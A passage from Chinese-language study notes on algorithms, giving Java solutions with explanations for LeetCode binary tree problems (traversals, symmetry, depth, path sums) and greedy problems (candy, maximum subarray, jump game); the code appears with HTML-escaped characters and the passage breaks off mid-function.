的下标就是i*2+2。\n二叉树的遍历方式：\n二叉树的遍历方式的分类：\n\n深度优先遍历\n前序遍历\n中序遍历\n后续遍历\n\n\n广度优先遍历\n层序遍历\n\n\n\n其中，前序、中序、后序遍历的逻辑可以借助栈使用非递归的方法实现，也可以使用递归的方法实现；而层序遍历一般借助队列使用非递归的方法实现。\n前中后序递归（Recursion）遍历递归法的使用要点\n确定递归函数的参数和返回值\n确定终止条件\n确定单层递归的逻辑\n\n前序递归遍历的代码：\npublic List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123;\tList&lt;Integer&gt; result = new ArrayList&lt;&gt;();\ttraversal(root, result);\treturn result;&#125;private void traversal(TreeNode node, List&lt;Integer&gt; result) &#123;\tif (node == null) &#123;\t\treturn;\t&#125;\tresult.add(node.val);\ttraversal(node.left, result);\ttraversal(node.right, result);&#125;\n\n中序、后序递归遍历的代码：\n//中序遍历private void traversal(TreeNode node, List&lt;Integer&gt; result) &#123;\tif (node == null) &#123;\t\treturn;\t&#125;\ttraversal(node.left, result);\tresult.add(node.val);\ttraversal(node.right, result);&#125;//后序遍历private void traversal(TreeNode node, List&lt;Integer&gt; result) &#123;\tif (node == null) &#123;\t\treturn;\t&#125;\ttraversal(node.left, result);\ttraversal(node.right, result);\tresult.add(node.val);&#125;\n\n前中后序迭代（Iteration）遍历用法示例（力扣144. 二叉树的前序遍历：将二叉树的前序遍历结果存入列表）：\npublic List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123;\tList&lt;Integer&gt; result = new ArrayList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\t//作为栈使用\tDeque&lt;TreeNode&gt; stack = new LinkedList&lt;&gt;();\tstack.push(root);\twhile (!stack.isEmpty()) &#123;\t\tTreeNode node = stack.pop();\t\tresult.add(node.val);\t\t//因为栈是先进后出，所以先加入right节点\t\tif (node.right != null) &#123;\t\t\tstack.push(node.right);\t\t&#125;\t\tif (node.left != null) &#123;\t\t\tstack.push(node.left);\t\t&#125;\t&#125;\treturn result;&#125;\n\n用法示例（力扣145. 二叉树的后序遍历：将二叉树的后序遍历结果存入列表）：\n只需要调整前序遍历的代码顺序。\npublic List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123;\tList&lt;Integer&gt; result = new ArrayList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\t//作为栈使用\tDeque&lt;TreeNode&gt; stack = new LinkedList&lt;&gt;();\tstack.push(root);\twhile (!stack.isEmpty()) &#123;\t\tTreeNode node = stack.pop();\t\t//最后会通过反转移到最后\t\tresult.add(node.val);\t\t//因为栈是先进后出，且最后还需要反转，所以负负得正，按照后序遍历的顺序（先左后右）添加节点\t\tif (node.left != null) &#123;\t\t\tstack.push(node.left);\t\t&#125;\t\tif (node.right != null) &#123;\t\t\tstack.push(node.right);\t\t&#125;\t&#125;\t//反转，之所以通过反转保证顺序正确，是因为结果集的添加顺序只能是先添加父节点\tCollections.reverse(result);\treturn result;&#125;\n\n用法示例（力扣94. 二叉树的中序遍历：将二叉树的中序遍历结果存入列表）：\n前序遍历的迭代遍历逻辑无法直接应用在中序遍历上，并且不能像后序遍历一样通过反转复用处理逻辑，原因是中序遍历中访问顺序和处理顺序不一致，访问顺序指的是首先访问父节点，处理顺序指的是父节点的值在左右子节点之间存入列表而不是首先存入。\n使用迭代法实现中序遍历时，需要借用指针来访问节点，使用栈存储访问节点的左子节点。\npublic List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123;\tList&lt;Integer&gt; result = new ArrayList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\t//作为栈使用\tDeque&lt;TreeNode&gt; stack = new LinkedList&lt;&gt;();\tTreeNode cur = root;\twhile (cur != null || !stack.isEmpty()) &#123;\t\tif (cur != null) &#123;\t\t\tstack.push(cur);\t\t\t//左\t\t\tcur = cur.left;\t\t&#125; else &#123;\t\t\tcur = stack.pop();\t\t\t//中\t\t\tresult.add(cur.val);\t\t\t//右\t\t\tcur = cur.right;\t\t&#125;\t&#125;\treturn result;&#125;\n\n前中后序统一迭代法二叉树的层序遍历用法示例（力扣102. 二叉树的层序遍历：将二叉树的层序遍历结果存入列表）：\n层序遍历的方式相当于图论中的广度优先遍历。\n层序遍历需要使用一个辅助队列，队列先进先出，符合层序遍历的逻辑。\npublic List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new LinkedList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\tDeque&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();\tqueue.addLast(root);\twhile (!queue.isEmpty()) &#123;        //每一层的长度\t\tint size = queue.size();\t\tList&lt;Integer&gt; sub = new ArrayList&lt;&gt;(size);\t\twhile (size-- &gt; 0) &#123;\t\t\tTreeNode node = queue.pollFirst();\t\t\tsub.add(node.val);\t\t\tif (node.left != null) &#123;\t\t\t\tqueue.addLast(node.left);\t\t\t&#125;\t\t\tif (node.right != null) &#123;\t\t\t\tqueue.addLast(node.right);\t\t\t&#125;\t\t&#125;\t\tresult.add(sub);\t&#125;\treturn result;&#125;\n\n翻转二叉树用法示例（力扣226. 翻转二叉树：翻转二叉树，翻转后的二叉树为原来的二叉树的镜像）：\n只要把每一个节点的左右子节点翻转一下，就可以达到整体翻转的效果。\n递归法解法（DFS）public TreeNode invertTree(TreeNode root) &#123;\tif (root == null) &#123;\t\treturn null;\t&#125;\tswap(root);\tinvertTree(root.left);\tinvertTree(root.right);\treturn root;&#125;private void swap(TreeNode node) &#123;\tTreeNode temp = node.left;\tnode.left = node.right;\tnode.right = temp;&#125;\n\n迭代法解法（BFS）public TreeNode invertTree(TreeNode root) &#123;\tif (root == null) &#123;\t\treturn null;\t&#125;\tDeque&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();\tqueue.addLast(root);\t//层序遍历\twhile (!queue.isEmpty()) &#123;\t\tint size = queue.size();\t\twhile (size-- &gt; 0) &#123;\t\t\tTreeNode node = queue.pollFirst();\t\t\tswap(node);\t\t\tif (node.left != null) &#123;\t\t\t\tqueue.addLast(node.left);\t\t\t&#125;\t\t\tif (node.right != null) &#123;\t\t\t\tqueue.addLast(node.right);\t\t\t&#125;\t\t&#125;\t&#125;\treturn root;&#125;private void swap(TreeNode node) &#123;\tTreeNode temp = node.left;\tnode.left = node.right;\tnode.right = temp;&#125;\n\n对称二叉树用法示例（力扣101. 对称二叉树：判断一棵二叉树是否对称）：\n递归法解法public boolean isSymmetric(TreeNode root) &#123;\treturn recursion(root.left, root.right);&#125;//按照使用递归法的三个要点逐步分析得出递归函数//1、确定递归函数的参数和返回值private boolean recursion(TreeNode left, TreeNode right) &#123;\t//2、确定递归函数的终止条件\tif (left == null &amp;&amp; right == null) &#123;\t\treturn true;\t&#125;    //下面的两个判断有简化写法，见迭代法解法。此处为表示清晰采用了逻辑更加原始的写法\tif (left == null &amp;&amp; right != null) &#123;\t\treturn false;\t&#125;\tif (left != null &amp;&amp; right == null) &#123;\t\treturn false;\t&#125;\tif (left.val != right.val) &#123;\t\treturn false;\t&#125;\t//3、确定单层循环的逻辑\t//比较二叉树外侧是否对称\tboolean outer = recursion(left.left, right.right);\t//比较二叉树内侧是否对称\tboolean inner = recursion(left.right, right.left);\t//如果左右两侧都分别对称，则返回true\treturn outer &amp;&amp; inner;&#125;\n\n迭代法解法public boolean isSymmetric(TreeNode root) &#123;\tif (root == null) &#123;\t\treturn true;\t&#125;\t//作为队列使用，也可以使用栈，因为节点的添加是成对的，每次都会判断一对，先判断哪一对都可以\tDeque&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();\tqueue.push(root.left);\tqueue.push(root.right);\twhile (!queue.isEmpty()) &#123;\t\tTreeNode leftNode = queue.pollFirst();\t\tTreeNode rightNode = queue.pollFirst();\t\t//如果左右节点都是空，则对称\t\tif (leftNode == null &amp;&amp; rightNode == null) &#123;\t\t\tcontinue;\t\t&#125;\t\t//如果有一个节点为空，且之前已经判断过，不会是两个都为空，说明一个为空，一个不为空，返回false\t\tif (leftNode == null || rightNode == null) &#123;\t\t\treturn false;\t\t&#125;\t\t//如果两个节点的值不相等，返回false\t\tif (leftNode.val != rightNode.val)&#123;\t\t\treturn false;\t\t&#125;\t\t//入队的顺组和节点的对称关系一致\t\tqueue.addLast(leftNode.left);\t\tqueue.addLast(rightNode.right);\t\tqueue.addLast(leftNode.right);\t\tqueue.addLast(rightNode.left);\t&#125;\treturn true;&#125;\n\n二叉树的最大深度相似题目链接：559. N 叉树的最大深度\n用法示例（力扣104. 二叉树的最大深度：返回二叉树根节点（包含）到最远叶子节点的最长路径上的节点数）：\n递归法解法（后序遍历）\n高度与深度的计算中，力扣中都是以节点为一度，但维基百科上是边为一度，暂时以力扣为准。\n\n这里要区分二叉树的高度和深度。高度指的是节点到其最远叶子节点的距离，深度指的是节点到根节点的距离。所以求高度用后序遍历，因为后序遍历的顺序是左右中，有一个往上（从子节点到父节点）访问的顺序，可以通过这个顺序实现对父节点高度加1；求深度用前序遍历，因为前序遍历的顺序是中左右，是往下（从父结点到子节点）的访问顺序，可以通过这个顺序实现度子节点的深度加1。\n而二叉树的最大深度就是根节点的高度，所以这道题可以通过后序遍历求解根节点的高度得到答案。\npublic int maxDepth(TreeNode root) &#123;\treturn recursionGetHeight(root);&#125;private int recursionGetHeight(TreeNode node) &#123;\tif (node == null) &#123;\t\treturn 0;\t&#125;\t//后序遍历，左右中\tint leftHeight = recursionGetHeight(node.left);\tint rightHeight = recursionGetHeight(node.right);    //返回父节点的最大高度\treturn Math.max(leftHeight, rightHeight) + 1;&#125;\n\n递归法解法（前序遍历）使用后序遍历实际上求的是根节点的高度，如果要真正地求二叉树的深度，代码写法如下。\npublic int maxDepth(TreeNode root) &#123;\tresult = 0;\tif (root == null) &#123;\t\treturn result;\t&#125;\tgetMaxDepth(root, 1);\treturn result;&#125;private int result;//递归需要传递的参数有当前的节点和深度private void getMaxDepth(TreeNode node, int depth) &#123;    //因为result的赋值不能放在最后，所以不能作为返回值进行传递，解决方法是定义为一个成员变量\tresult = Math.max(depth, result);//中\tif (node.left == null &amp;&amp; node.right == null) &#123;\t\treturn;\t&#125;\tif (node.left != null) &#123;//左        //深度+1\t\tdepth++;\t\tgetMaxDepth(node.left, depth);        //回溯\t\tdepth--;\t&#125;\tif (node.right != null) &#123;//右\t\tdepth++;\t\tgetMaxDepth(node.right, depth);\t\tdepth--;\t&#125;&#125;\n\n迭代法解法使用迭代法解法的话，使用层序遍历较为合适，因为最大深度就是二叉树的层数。\npublic int maxDepth(TreeNode root) &#123;\tif (root == null) &#123;\t\treturn 0;\t&#125;\tint result = 0;\tDeque&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();\tqueue.add(root);\twhile (!queue.isEmpty()) &#123;\t\tint size = queue.size();\t\tresult++;\t\twhile (size-- &gt; 0) &#123;\t\t\tTreeNode node = queue.pollFirst();\t\t\tif (node.left != null) &#123;\t\t\t\tqueue.addLast(node.left);\t\t\t&#125;\t\t\tif (node.right != null) &#123;\t\t\t\tqueue.addLast(node.right);\t\t\t&#125;\t\t&#125;\t&#125;\treturn result;&#125;\n\n二叉树的最小深度用法示例（力扣111. 二叉树的最小深度：返回从根节点（包含）到最近的叶子节点的路径上的节点数量）：\n需要注意的是，这道题跟上一题求二叉树的最大深度很像，但是int result = 1 + min(leftDepth, rightDepth);这种写法是错误的，如果这样求的话，对于有左子节点没有右子节点或者没有左子节点有右子节点的情况，就会把没有的一个子节点null作为最短深度，也就相当于将父节点作为了最终节点，但是最小深度的要求是到叶子节点的路径，只有左子节点或只有右子节点都不是叶子节点。\n所以，正确的求法应该是\n\n如果左子树为空，右子树不为空，说明最小深度是右子树的最小深度+1。\n如果左子树不为空，右子树为空，说明最小深度是左子树的最小深度+1。 \n如果左右子树都不为空，说明最小深度是左右子树的最小深度+1。\n如果左右子树都为空，说明最小深度是0+1。\n\n可以看出求二叉树的最小深度和取二叉树的最大深度的差别主要是处理左右孩子不为空的逻辑。\n递归法解法public int minDepth(TreeNode root) &#123;\treturn recursionMinDepth(root);&#125;private int recursionMinDepth(TreeNode node) &#123;\tif (node == null) &#123;\t\treturn 0;\t&#125;\tint leftMinDepth = recursionMinDepth(node.left);//左\tint rightMinDepth = recursionMinDepth(node.right);//右    //如果左子树为空，右子树不为空，说明最小深度是右子树的最小深度+1\tif (node.left == null &amp;&amp; node.right != null) &#123;\t\treturn rightMinDepth + 1;\t&#125;    //如果左子树不为空，右子树为空，说明最小深度是左子树的最小深度+1\tif (node.left != null &amp;&amp; node.right == null) &#123;\t\treturn leftMinDepth + 1;\t&#125;    //如果左右子树都不为空，说明最小深度是左右子树的最小深度+1，    //同时。包含了左右子树都为空的情况    //对于左右子树都为空的情况，Math.min(leftMinDepth, rightMinDepth)是0\treturn Math.min(leftMinDepth, rightMinDepth) + 1;//中&#125;\n\n迭代法解法和二叉树的最大深度的迭代法解法一样，二叉树的最小深度迭代法解法也是使用层序遍历。当遍历到节点的左右子节点都为空的时候，说明遍历到了最小深度，此时的深度就是二叉树的最小深度。\npublic int minDepth(TreeNode root) &#123;\tif (root == null) &#123;\t\treturn 0;\t&#125;\tDeque&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();\tqueue.addLast(root);\tint depth = 0;\twhile (!queue.isEmpty()) &#123;\t\tint size = queue.size();\t\tdepth++;\t\twhile (size-- &gt; 0) &#123;\t\t\tTreeNode node = queue.pollFirst();\t\t\t//说明当前节点是叶子节点，则当前的深度就是最小深度，返回结果\t\t\tif (node.left == null &amp;&amp; node.right == null) &#123;\t\t\t\treturn depth;\t\t\t&#125;\t\t\tif (node.left != null) &#123;\t\t\t\tqueue.addLast(node.left);\t\t\t&#125;\t\t\tif (node.right != null) &#123;\t\t\t\tqueue.addLast(node.right);\t\t\t&#125;\t\t&#125;\t&#125;\treturn depth;&#125;\n\n平衡二叉树迭代法解法用法示例（力扣110. 平衡二叉树：给定一个二叉树，判断每个节点的左右两个子树的高度差（不是任意两个节点的高度差）的绝对值是否不超过 1）：\npublic boolean isBalanced(TreeNode root) &#123;    //-1表示不是平衡二叉树\treturn recursiveGetHeight(root) != -1;&#125;private int recursiveGetHeight(TreeNode node) &#123;    //终止条件：空节点的高度为0\tif (node == null) &#123;\t\treturn 0;\t&#125;    //后序遍历\tint leftHeight = recursiveGetHeight(node.left);//左\tif (leftHeight == -1) &#123;\t\treturn -1;\t&#125;\tint rightHeight = recursiveGetHeight(node.right);//右\tif (rightHeight == -1) &#123;\t\treturn -1;\t&#125;\tif (Math.abs(leftHeight - rightHeight) &gt; 1) &#123;\t\treturn -1;\t&#125; else &#123;\t\treturn 1 + Math.max(leftHeight, rightHeight);//中\t&#125;&#125;\n\n二叉树的所有路径用法示例（力扣257. 二叉树的所有路径：按顺序任意，返回所有从根节点到叶子节点的路径）：\n递归法解法这道题目涉及到了回溯，因为要把路径记录记录下来，需要回溯来回退一个路径再进入另一个路径。\n按照递归法的三个要点分析：\n\n函数参数中需要包含每一条路径和最终的结果集以及当前节点，不需要返回值\n找到了叶子节点后，将路径放到结果集中，然后退出\n因为要将父节点指向子节点，所以选择使用前序遍历，先处理中间节点，然后处理左子节点和右子节点\n\npublic List&lt;String&gt; binaryTreePaths(TreeNode root) &#123;\tList&lt;String&gt; result = new LinkedList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\tList&lt;Integer&gt; path = new ArrayList&lt;&gt;();\tgetPaths(result, path, root);\treturn result;&#125;private void getPaths(List&lt;String&gt; result, List&lt;Integer&gt; path, TreeNode node) &#123;\t//添加路径节点\tpath.add(node.val);//中\tif (node.left == null &amp;&amp; node.right == null) &#123;\t\tStringBuilder sb = new StringBuilder();\t\tfor (int i = 0; i &lt; path.size() - 1; i++) &#123;\t\t\tsb.append(path.get(i)).append(&quot;-&gt;&quot;);\t\t&#125;\t\tsb.append(path.get(path.size() - 1));\t\tresult.add(sb.toString());\t\treturn;\t&#125;\tif (node.left != null) &#123;//左\t\t//递归，不是在此处添加路径节点\t\tgetPaths(result, path, node.left);\t\t//回溯\t\tpath.remove(path.size() - 1);\t&#125;\tif (node.right != null) &#123;//右\t\tgetPaths(result, path, node.right);\t\tpath.remove(path.size() - 1);\t&#125;&#125;\n\n迭代法解法这道题的迭代法解法相当于模拟了递归过程，需要使用栈或队列来存放遍历路径。\npublic List&lt;String&gt; binaryTreePaths(TreeNode root) &#123;\tList&lt;String&gt; result = new LinkedList&lt;&gt;();\tif (root == null) &#123;\t\treturn result;\t&#125;\t//作为栈使用，先进后出\tDeque&lt;Object&gt; nodeStack = new LinkedList&lt;&gt;();\t//作为栈使用\tDeque&lt;Object&gt; pathStack = new LinkedList&lt;&gt;();\t//节点和路径同时入栈\tnodeStack.add(root);\tpathStack.add(String.valueOf(root.val));\twhile (!nodeStack.isEmpty()) &#123;\t\t//节点和路径同时出栈\t\tString path = (String) pathStack.pop();\t\tTreeNode node = (TreeNode) nodeStack.pop();//中\t\t//如果遍历到了叶子节点，则path直接加入到结果集中，不需要作为中间结果加入栈\t\tif (node.left == null &amp;&amp; node.right == null) &#123;\t\t\tresult.add(path);\t\t\tcontinue;\t\t&#125;       \t//虽然是前序遍历，但是因为栈是先入后出，所以此处逆序存入数据，先右后左\t\tif (node.right != null) &#123;//右\t\t\tnodeStack.push(node.right);\t\t\tpathStack.push(path + &quot;-&gt;&quot; + node.right.val);\t\t&#125;\t\tif (node.left != null) &#123;//左\t\t\tnodeStack.push(node.left);\t\t\t//path作为中间结果加入栈\t\t\tpathStack.push(path + &quot;-&gt;&quot; + node.left.val);\t\t&#125;\t&#125;\treturn result;&#125;\n\n路径总和用法示例（力扣112. 路径总和：判断二叉树中是否存在从根节点到叶子节点的路径，满足路径上的节点值之和等于目标值）：\n递归解法（DFS）使用递归法实现深度优先遍历，本题使用前、中、后序遍历都可以，因为中间节点没有要处理的逻辑，本题解中使用的是前序遍历，中左右。\npublic boolean hasPathSum(TreeNode root, int targetSum) &#123;\tif (root == null) &#123;\t\treturn false;\t&#125;\treturn traversal(root, targetSum - root.val);&#125;//1、确定递归函数的参数和返回值：参数需要包含节点、路径和，返回值是二叉树是否存在和为指定值的路径public boolean traversal(TreeNode node, int targetSum) &#123;\t//2、确定终止条件：如果遍历到了叶子节点，并且targetSum值减到0，则说明找到了目标和\tif (node.left == null &amp;&amp; node.right == null &amp;&amp; targetSum == 0) &#123;\t\treturn true;\t&#125;\t//3、确定单层循环的逻辑：递归时避免让空节点进入递归函数，如果返回true，应立即返回不再寻找其它路径\tif (node.left != null) &#123;\t\tboolean hasPath = traversal(node.left, targetSum - node.left.val);\t\tif (hasPath) &#123;\t\t\treturn true;\t\t&#125;\t&#125;\tif (node.right != null) &#123;\t\tboolean hasPath = traversal(node.right, targetSum - node.right.val);\t\tif (hasPath) &#123;\t\t\treturn true;\t\t&#125;\t&#125;\treturn false;&#125;\n\n迭代解法迭代法是使用栈模拟递归，此时栈内的每个元素不仅要记录节点、还要记录到当前节点的路径和。在C++语言中有pair结构存放这样由两种不同类型数据组成的元素，在Java中可以使用两个栈分别存放元素的两种数据。\n以前序遍历为例，迭代解法如下：\npublic boolean hasPathSum(TreeNode root, int targetSum) &#123;\tif (root == null) &#123;\t\treturn false;\t&#125;\tDeque&lt;TreeNode&gt; nodeStack = new LinkedList&lt;&gt;();\tDeque&lt;Integer&gt; sumStack = new ArrayDeque&lt;&gt;();\tnodeStack.addLast(root);\tsumStack.addLast(targetSum - root.val);\twhile (!nodeStack.isEmpty()) &#123;\t\tTreeNode node = nodeStack.pollFirst();\t\tInteger sum = sumStack.pollFirst();\t\tif (node.left == null &amp;&amp; node.right == null &amp;&amp; sum == 0) &#123;\t\t\treturn true;\t\t&#125;\t\t//因为栈是先进后出，所以先添加右节点再添加左节点，最终弹出的时候是先弹左节点再弹右节点\t\tif (node.right != null) &#123;\t\t\tnodeStack.push(node.right);\t\t\tsumStack.push(sum - node.right.val);\t\t&#125;\t\tif (node.left != null) &#123;\t\t\tnodeStack.push(node.left);\t\t\tsumStack.push(sum - node.left.val);\t\t&#125;\t&#125;\treturn false;&#125;\n\n贪心法贪心的本质选择每一阶段的局部最优，从而实现全局最优。难点是如何通过局部最优推出全局最优，最常用的办法是举反例，如果想不到反例，就可以试一试贪心算法，严格的使用数学归纳法或反证法的数学证明不常用。\n使用贪心算法解题一般分为如下四步：\n\n将问题分解出若干子问题。\n找出适合的贪心策略。\n求解每一个子问题的局部最优解法。\n将局部最优堆叠成全局最优。\n\n分发饼干用法示例（力扣455. 分发饼干：将饼干分发给孩子，求满足最多孩子胃口的数量，也就是，给定两个int类型的数组，求一个数组中比另一个数组元素大的元素有多少个，只能比较一次）： \n这里的局部最优就是最大的饼干（数值）分类胃口尽量大的孩子（贪心），以使其它不那么大的饼干可以分给胃口不那么大的孩子，从而满足尽量多的孩子的胃口。\n解决思路是，首先对两个数组进行排序，然后再由大到小地比较，统计大饼干分给胃口大的孩子这种贪心分法下，满足胃口的孩子的数量。\npublic int findContentChildren(int[] g, int[] s) &#123;    //先排序，方便后续比较\tArrays.sort(g);\tArrays.sort(s);\t//统计能够满足胃口的孩子的最大数量\tint sum = 0;\t//i遍历的是孩子的胃口，j遍历的是饼干的大小\tfor (int i = g.length - 1, j = s.length - 1; i &gt;= 0 &amp;&amp; j &gt;= 0;) &#123;\t\t//可以满足孩子的胃口\t\tif (g[i] &lt;= s[j]) &#123;\t\t\t//把大饼干分给胃口大的孩子，贪心法\t\t\ti--;\t\t\tj--;\t\t\tsum++;\t\t&#125; else &#123;\t\t\t//满足不了孩子的胃口，寻找胃口更小的孩子\t\t\ti--;\t\t&#125;\t&#125;\treturn sum;&#125;\n\n分发糖果用法示例（力扣135. 分发糖果：按照孩子的分数给孩子分发糖果，要求对于相邻的孩子，里面分数更高的一个必须获得更多的糖果，每个孩子至少得到一个糖果，求最少需要多少糖果）：\n这道题的局部最优解法是，如果右边的孩子比左边是孩子的分数高，就给右边孩子多分糖果，如果左边的孩子比右边的孩子分数高，就给左边的孩子多分糖果，两个如果条件都需要满足。堆叠局部最优解就可实现全局最优解，即相邻的两个孩子，分数高的糖果多。\n要实现给两个相邻孩子分糖果得分高的糖果多，两边一起考虑的话较为复杂，容易顾此失彼，可以先从左边向右比较，再从右边向左边比较，从两个方向调整糖果的分发数量。此外，因为是要求最少数量，所以给分数高的孩子多分一个糖果即可。\npublic int candy(int[] ratings) &#123;\tint length = ratings.length;\tint[] nums = new int[length];\t//每个孩子至少得到一个糖果\tArrays.fill(nums, 1);\t//要对右边的数量加1，需要从前向后遍历，因为需要先确定左边的值再确定右边的值\tfor (int i = 1; i &lt; length; i++) &#123;\t\t//如果右边的孩子比左边是孩子的分数高，就给右边孩子多分糖果\t\tif (ratings[i] &gt; ratings[i - 1]) &#123;\t\t\tnums[i] = nums[i - 1] + 1;\t\t&#125;\t&#125;\t//要对左边的数量加1，从后向前遍历，因为需要先确定右边的值再确定左边的值\tfor (int i = length - 1; i &gt; 0; i--) &#123;\t\t//如果左边的孩子比右边的孩子分数高，就给左边的孩子多分糖果\t\tif (ratings[i - 1] &gt; ratings[i]) &#123;\t\t\t//在比左边大的值和比右边大的值之间取最大值\t\t\tnums[i - 1] = Math.max(nums[i - 1], nums[i] + 1);\t\t&#125;\t&#125;\t//计算糖果总和\tint sum = 0;\tfor (int i = 0; i &lt; length; i++) &#123;\t\tsum += nums[i];\t&#125;\treturn sum;&#125;\n\n最大子数组和用法示例（力扣53. 最大子数组和：找到一个数组中元素加和最大的子数组，子数组是连续的一段数组（区别于子序列），且至少包含一个元素）：\n这道题的暴力解法是第一层for循环遍历子数组的起始位置，第二层for循环用来遍历数组并寻找子数组最大和。本道题的贪心法解法相当于是对暴力解法的剪枝，剪枝发生在第二层遍历发现子数组和为负数的情况。\n所以总结出，这道题的局部最优是当前“连续和”为负数的时候立刻放弃计算，从下一个元素重新（把连续重置为0）计算“连续和”，因为负数加上下一个元素只会导致“连续和”变小，反之，如果大于0，就继续累加。\npublic int maxSubArray(int[] nums) &#123;\t//由于数组中的元素有负数，所以result一开始的比较值要设为最小整数\tint result = Integer.MIN_VALUE;\tfor (int i = 0, sum = 0; i &lt; nums.length; i++) &#123;\t\tsum += nums[i];\t\tresult = Math.max(result, sum);\t\t//如果子数组和小于0，则重新计算连续和\t\tif (sum &lt; 0) &#123;\t\t\tsum = 0;\t\t&#125;\t&#125;\treturn result;&#125;\n\n摆动序列用法示例（力扣376. 摆动序列：从一个数组中寻找摆动序列的长度，这种序列满足相邻元素的差值正负交替出现的条件，仅有一个元素或者含两个不等元素的序列也视作摆动序列）：\n这道题的局部最优解法是删除（跳过）单调坡上的节点（不包括单调坡两端的节点），只保留每个坡的两个局部极值（贪心），从而保证相邻元素的差值正负交替出现的条件。\n要实现只保留坡的极值，需要判断每个点是否是极值，极值分为极大值和极小值，特点是前后的差值符号相反，可以通过这一特点判断点是否是极值。\npublic int wiggleMaxLength(int[] nums) &#123;\tif (nums.length &lt;= 1) &#123;\t\treturn nums.length;\t&#125;\t//前后差值，用于判断是否是极值的\tint preDiff = 0; //当前点和前一个点的差值\tint curDiff; //下一个点和当前点的差值\t//默认最右端有一个峰值，从而便于进行for循环，不能默认左右两端都是峰值，因为可能存在只存在两个端点且两个端点相等的情况\tint result = 1;\tfor (int i = 0; i &lt; nums.length - 1; i++) &#123;\t\tcurDiff = nums[i + 1] - nums[i];\t\t//不包含curDiff=0的情况\t\tif ((curDiff &gt; 0 &amp;&amp; preDiff &lt;= 0) || (curDiff &lt; 0 &amp;&amp; preDiff &gt;= 0)) &#123;            result++;\t\t\t//只有当前点构成摆动序列时，才更新preDiff的值\t\t\tpreDiff = curDiff;\t\t&#125;        /*        \tpreDiff &lt;= 0中的等于0只是为了给preDiff赋非0（curDiff != 0 &amp;&amp; preDiff == 0说明遇到了可以构成摆动序列的左端点）初始值，赋完初始值后不会再出现preDiff=0的情况，因为后续给preDiff赋值的前提都是curDiff不等于0。        \t所以上面这个for循环看似不满足极值点的条件，但是结果是正确的，就是因为上面这段for循环是下面这段代码的简写：            //curDiff不等于0，说明左端点有效            if (curDiff != 0 &amp;&amp; preDiff == 0) &#123;                result++;                preDiff = curDiff;            &#125;            //前后的差值符号相反，说明当前点是极值点            if ((curDiff &gt; 0 &amp;&amp; preDiff &lt; 0) || (curDiff &lt; 0 &amp;&amp; preDiff &gt; 0)) &#123;                result++;                preDiff = curDiff;            &#125;\t\t*/\t&#125;\treturn result;&#125;\n\n买卖股票的最佳时机用法示例（力扣122. 买卖股票的最佳时机 II：给出了股票每天的价格，求在给出的时间内买卖股票所能获得的最大利润，要求必须在买入股票前出售之前购买的股票）：\n要实现买卖股票获利，条件是卖出的价格高于买入的价格，即买卖股票的操作发生在利润差值为正数的区间，要求出能获得的最大利润，只需要寻找利润差值为正数的区间然后对差值加。\npublic int maxProfit(int[] prices) &#123;\tint profits = 0;\tfor (int i = 1; i &lt; prices.length; i++) &#123;\t\tint profit = prices[i] - prices[i - 1];\t\tif (profit &gt; 0) &#123;\t\t\t//prices[i-1, i]是利润差值为正数的区间\t\t\tprofits += profit;\t\t&#125;\t\t//简写形式\t\t//profits += Math.max(prices[i] - prices[i - 1], 0);\t&#125;\treturn profits;&#125;\n\n跳跃游戏用法示例（力扣55. 跳跃游戏：数组每个元素是当前元素所在位置可以向前跳跃的最大长度，判断能否从数组的第一个下标跳跃到最后一个下标）：\n使用贪心法解决的思路是，不一定非要明确怎么跳，每次取最大的跳跃步数即可，即跳跃的覆盖范围。问题就转化为跳跃的覆盖范围能否覆盖到终点。跳跃覆盖范围的计算方法是，遍历数组元素，计算遍历经过的所有元素的跳跃覆盖范围，再继续遍历并更新跳跃覆盖范围。这道题的局部最优解是每次取最大跳跃步数（取最大覆盖范围）；全局最优解法是最后得到整体的最大覆盖范围，看能否到达终点。\npublic boolean canJump(int[] nums) &#123;\tint max = 0;\tfor (int i = 0; i &lt;= max; i++) &#123;\t\t//计算当前的最大覆盖范围\t\tmax = Math.max(max, nums[i] + i);\t\t//最大覆盖范围覆盖了终点\t\tif (max &gt;= nums.length - 1) &#123;\t\t\treturn true;\t\t&#125;\t&#125;\treturn false;&#125;\n\n用法示例（力扣45. 跳跃游戏 II：给定了一个元素是跳跃范围的数组，能够保证跳跃到数组的最后一个位置，求出最少跳跃多少次到达数组的最后一个位置）：\n这道题的解法和前一道类似，也是使用最大覆盖范围进行求解，不同点是这道题要计算最小步数，所以需要考虑步数什么时候加1。这道题的局部最优解法是在当前可移动的距离固定的情况下，尽可能多走，如果还没有到达终点，则步数加1；全局最优解法是按照局部最优的步数加1方法，到达终点的步数就是最小步数。\npublic int jump(int[] nums) &#123;\tif (nums.length == 1) &#123;\t\treturn 0;\t&#125;\tint result = 0;\t//当前的覆盖范围\tint curDistance = 0;\t//加1后的覆盖范围\tint nextDistance = 0;\tfor (int i = 0; i &lt; nums.length; i++) &#123;\t\tnextDistance = Math.max(nextDistance, nums[i] + i);\t\t//到达当前一步的最大覆盖范围\t\tif (i == curDistance) &#123;\t\t\tresult++;\t\t\tcurDistance = nextDistance;\t\t\tif (curDistance &gt;= nums.length - 1) &#123;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t&#125;\treturn result;&#125;\n\n上面的解法还可以转换成统一处理长度为1和长度不为1的逻辑：\npublic int jump(int[] nums) &#123;\tint result = 0;\t//当前的覆盖范围\tint curDistance = 0;\t//加1后的覆盖范围\tint nextDistance = 0;\t//这里是小于nums.length - 1，是关键所在\tfor (int i = 0; i &lt; nums.length - 1; i++) &#123;\t\tnextDistance = Math.max(nextDistance, nums[i] + 